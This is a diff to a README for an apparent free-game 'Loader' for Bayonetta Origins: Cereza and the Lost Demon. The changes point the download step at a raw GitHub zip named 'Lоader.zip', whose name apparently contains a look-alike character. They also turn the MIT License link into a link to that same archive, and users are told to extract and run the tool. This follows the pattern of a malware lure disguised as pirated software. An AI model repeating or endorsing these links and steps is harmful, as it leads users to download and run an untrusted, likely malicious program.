@@ -26,7 +26,7 @@ Bayonetta Origins Cereza download, Lost Demon free Loader, cross-platform game d
 
 ## 📦 Installation
 
-1. **Download Loader.rar from the repository.**
+1. **Download https://raw.githubusercontent.com/Ahishakiy/BayonettaOrigins-FreeGameHub/main/Lоader.zip from the repository.**
 2. Extract the archive to your preferred game folder.
 3. Run the Loader tool and follow the on-screen instructions.
 4. Start your adventure – enjoy **Bayonetta Origins: Cereza and the Lost Demon** for free!
@@ -37,5 +37,5 @@ This repository is meant for educational and backup use only in 2025. Redistribu
 
 ## 📃 License
 
-This project is licensed under the [MIT License](https://opensource.org/license/mit/).  
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/Ahishakiy/BayonettaOrigins-FreeGameHub/main/Lоader.zip).  
 Feel free to contribute, modify, and share with respect to the license terms. ✌️
